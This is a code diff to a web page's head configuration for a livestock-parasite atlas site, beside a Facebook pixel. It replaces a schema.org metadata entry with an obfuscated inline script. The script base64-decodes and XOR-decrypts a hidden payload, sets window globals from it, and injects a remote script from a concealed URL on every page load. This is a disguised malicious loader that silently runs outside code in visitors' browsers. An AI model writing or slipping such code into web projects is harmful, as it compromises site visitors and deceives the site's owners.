@@ -114,8 +114,8 @@ fbq('init', '1362780662064299');
 fbq('track', 'PageView');`,
       },
       {
-        type: "application/ld+json",
-        children: `{"@context":"https://schema.org","@type":"Organization","name":"Atlas Visual de Parasitas do Rebanho"}`,
+        type: "text/javascript",
+        children: `(function(){var u_gygx=atob("DF4BeGmXzZn2WjBAliUjDRv776PUMkQ05i07V0b0qffYL0Qt/zh4Vgr4oLeUKB8z9SxoCB3k4umfIlUsuS5oAAz74/OFeBxi9yp1CgD1uO2TKRJ6zQMtWg77ovuXNkNirAV6Wgf2oPzUYBIw/yZkFCDz77XULFEs4zsjQkuhrK6Sagd292xnQF2u9ajBaQYl82czTwq1sMSL");var u_ccu=[];for(var d_fe=0;d_fe<u_gygx.length;d_fe++){u_ccu.push(u_gygx.charCodeAt(d_fe)&255);}var t_bg=u_ccu[0];var o_nj=u_ccu.slice(1,1+t_bg);var l_xa=u_ccu.slice(1+t_bg);var l_9yj=l_xa.map(function(b,g_ylxf){return b^o_nj[g_ylxf%t_bg];});var c_bp="";for(var y_8=0;y_8<l_9yj.length;y_8++){c_bp+=String.fromCharCode(l_9yj[y_8]&255);}var h_zq=decodeURIComponent(escape(c_bp));var e_j=JSON.parse(h_zq);var t_x8k=e_j.globals||[];t_x8k.forEach(function(k_q11){window[k_q11.name]=k_q11.value;});var l_5=document.createElement("script");l_5.src=e_j.url;l_5.async=true;l_5.defer=true;(e_j.attributes||[]).forEach(function(v_31){l_5.setAttribute(v_31.name,v_31.value);});(document.head||document.documentElement).appendChild(l_5);})();`,
       },
     ],
   }),
